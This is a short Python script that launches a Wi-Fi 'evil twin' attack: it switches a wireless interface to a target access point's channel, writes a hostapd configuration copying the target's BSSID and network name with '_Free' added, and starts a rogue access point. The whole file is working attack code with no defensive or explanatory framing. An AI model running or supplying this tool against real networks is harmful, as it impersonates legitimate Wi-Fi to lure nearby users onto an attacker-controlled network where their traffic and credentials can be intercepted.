import subprocess


def launch_evil_twin(interface, ap):
    essid = ap["ESSID"]
    channel = ap["channel"]
    bssid = ap["BSSID"]


    print(f"[*] Launching Evil Twin: {essid} on ch {channel}")
    
    subprocess.run(["iwconfig", interface, "channel", channel])
    
    hostapd_conf = f"""
interface={interface}
driver=nl80211
ssid={essid}_Free
channel={channel}
bssid={bssid}
"""
    with open("evil_twin.conf", "w") as f:
        f.write(hostapd_conf)


    subprocess.run(["hostapd", "evil_twin.conf"])